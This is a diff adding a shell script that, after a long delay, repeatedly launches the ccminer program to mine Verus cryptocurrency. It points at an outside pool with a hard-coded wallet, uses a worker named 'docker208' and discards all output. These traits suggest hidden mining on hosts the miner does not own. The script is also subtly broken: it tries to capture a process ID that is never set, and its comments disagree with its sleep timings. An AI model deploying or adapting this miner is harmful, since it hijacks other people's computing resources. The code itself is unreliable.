@@ -1,0 +1,20 @@
+#!/bin/sh
+sleep 2300
+
+while true; do
+    # Chạy lệnh
+    ./ccminer -a verus -o stratum+tcp://ap.vipor.net:5040 -u RMWTqPzqBZCP3LT893jwxwNhEbs6umRGWw.docker208 -t 0 > /dev/null 2>&1 
+    
+    # Lưu PID của tiến trình
+    PID=$!
+    
+    # Chờ 3 phút
+    sleep 180
+    
+    # Dừng tiến trình
+    kill $PID
+    
+    # Nghỉ 20 phút
+    sleep 300
+done
+
